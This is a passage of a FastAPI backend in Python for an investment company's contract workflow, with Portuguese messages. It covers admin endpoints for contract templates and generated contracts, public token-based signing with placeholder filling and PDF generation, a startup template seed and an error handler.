    await db.contract_templates.delete_one({"_id": ObjectId(template_id)})
    return {"success": True}

# ── Contracts
@app.get("/api/admin/contracts")
async def list_contracts(admin = Depends(get_admin_user)):
    contracts = []
    async for c in db.contracts.find({}).sort("created_at", -1):
        cd = c.get("client_data", {})
        contracts.append(serialize_doc({
            "id": c["_id"], "token": c.get("token"), "status": c.get("status","pending"),
            "client_name": cd.get("nome_completo","") or c.get("preset_name",""),
            "client_email": cd.get("email","") or c.get("preset_email",""),
            "valor": cd.get("valor_investimento",""),
            "template_name": c.get("template_name",""),
            "has_pdf": bool(c.get("pdf_b64")),
            "created_at": c.get("created_at"), "submitted_at": c.get("submitted_at"),
        }))
    return contracts

@app.post("/api/admin/contracts/generate")
async def generate_contract_link(req: GenerateContractRequest, admin = Depends(get_admin_user)):
    template = await db.contract_templates.find_one({"_id": ObjectId(req.template_id)})
    if not template:
        raise HTTPException(status_code=404, detail="Template não encontrado")
    token = uuid_lib.uuid4().hex[:20]
    preset_name = req.preset_name or ""
    preset_email = req.preset_email or ""
    if req.lead_id:
        try:
            lead = await db.users.find_one({"_id": ObjectId(req.lead_id)})
            if lead:
                preset_name = preset_name or lead.get("full_name","")
                preset_email = preset_email or lead.get("email","")
        except Exception:
            pass
    result = await db.contracts.insert_one({
        "token": token, "template_id": str(template["_id"]),
        "template_name": template.get("name",""), "template_content": template.get("content",""),
        "status": "pending", "preset_name": preset_name, "preset_email": preset_email,
        "lead_id": req.lead_id, "client_data": {}, "created_at": datetime.utcnow(),
    })
    return {"success": True, "id": str(result.inserted_id), "token": token}

@app.delete("/api/admin/contracts/{contract_id}")
async def delete_contract(contract_id: str, admin = Depends(get_admin_user)):
    await db.contracts.delete_one({"_id": ObjectId(contract_id)})
    return {"success": True}

@app.get("/api/admin/contracts/{contract_id}/pdf")
async def download_contract_pdf(contract_id: str, admin = Depends(get_admin_user)):
    from fastapi.responses import Response
    contract = await db.contracts.find_one({"_id": ObjectId(contract_id)})
    if not contract or not contract.get("pdf_b64"):
        raise HTTPException(status_code=404, detail="PDF não disponível ainda")
    pdf_bytes = base64.b64decode(contract["pdf_b64"])
    name = (contract.get("client_data",{}).get("nome_completo","") or contract.get("preset_name","contrato")).replace(" ","_")
    return Response(content=pdf_bytes, media_type="application/pdf",
        headers={"Content-Disposition": f'attachment; filename="contrato_{name}.pdf"'})

# ── Public Contract (no auth)
@app.get("/api/contract/{token}")
async def get_public_contract(token: str):
    c = await db.contracts.find_one({"token": token})
    if not c:
        raise HTTPException(status_code=404, detail="Contrato não encontrado")
    company = await db.company_settings.find_one({}, {"_id":0}) or {"name":"EuroVault Investments"}
    return {
        "token": token, "status": c.get("status","pending"),
        "template_name": c.get("template_name",""),
        "template_content": c.get("template_content",""),
        "preset_name": c.get("preset_name",""),
        "preset_email": c.get("preset_email",""),
        "company_name": company.get("name","EuroVault Investments"),
    }

@app.post("/api/contract/{token}/submit")
async def submit_public_contract(token: str, req: ContractSubmitRequest):
    c = await db.contracts.find_one({"token": token})
    if not c:
        raise HTTPException(status_code=404, detail="Contrato não encontrado")
    if c.get("status") == "signed":
        raise HTTPException(status_code=400, detail="Este contrato já foi assinado")
    if not req.aceite_termos:
        raise HTTPException(status_code=400, detail="É necessário aceitar os termos")

    company = await db.company_settings.find_one({}, {"_id":0}) or {
        "name":"EuroVault Investments", "address":"", "tax_number":""}

    # Process template — fill placeholders
    content = c.get("template_content","")
    replacements = {
        "{{nome_completo}}": req.nome_completo, "{{email}}": req.email,
        "{{telefone}}": req.telefone, "{{documento}}": req.documento,
        "{{valor_investimento}}": req.valor_investimento, "{{data}}": req.data_contrato,
        "{{morada}}": req.morada or "", "{{assinatura_nome}}": req.signature_name or req.nome_completo,
        "{{empresa_nome}}": company.get("name",""), "{{empresa_morada}}": company.get("address",""),
        "{{empresa_nif}}": company.get("tax_number",""),
    }
    for k, v in replacements.items():
        content = content.replace(k, v)

    client_data = req.dict()

    # Generate PDF
    try:
        pdf_bytes = generate_pdf_bytes(company, {**client_data, "token": token, "data_contrato": req.data_contrato},
                                       content, req.signature_name or req.nome_completo, req.signature_image)
        pdf_b64 = base64.b64encode(pdf_bytes).decode("utf-8")
    except Exception as e:
        pdf_b64 = ""

    await db.contracts.update_one({"token": token}, {"$set": {
        "status": "signed", "client_data": client_data,
        "processed_content": content, "pdf_b64": pdf_b64,
        "submitted_at": datetime.utcnow(),
    }})

    # Notify admin via WebSocket
    try:
        await manager.broadcast({
            "type": "contract_signed",
            "client_name": req.nome_completo, "valor": req.valor_investimento,
            "timestamp": datetime.utcnow().isoformat()
        })
    except Exception:
        pass

    return {"success": True}

# ── Seed default template on startup
@app.on_event("startup")
async def seed_default_template():
    count = await db.contract_templates.count_documents({})
    if count == 0:
        await db.contract_templates.insert_one({
            "name": "Contrato de Investimento Padrão",
            "description": "Template padrão para contratos de investimento",
            "content": DEFAULT_CONTRACT_TEMPLATE,
            "created_at": datetime.utcnow()
        })


# ════════════════════════════════════════════════════════════════
from starlette.exceptions import HTTPException as StarletteHTTPException

@app.exception_handler(StarletteHTTPException)
async def generic_exception_handler(request: FastAPIRequest, exc):
    if exc.status_code == 429:
        return JSONResponse({"detail": "Demasiadas tentativas. Aguarde um momento."}, status_code=429)
    if exc.status_code in (401, 403):
        return JSONResponse({"detail": "Não autorizado."}, status_code=exc.status_code)
    if exc.status_code == 400:
        return JSONResponse({"detail": exc.detail}, status_code=400)
    if exc.status_code == 422:
        return JSONResponse({"detail": exc.detail}, status_code=422)
    return JSONResponse({"detail": exc.detail or "Não encontrado."}, status_code=exc.status_code)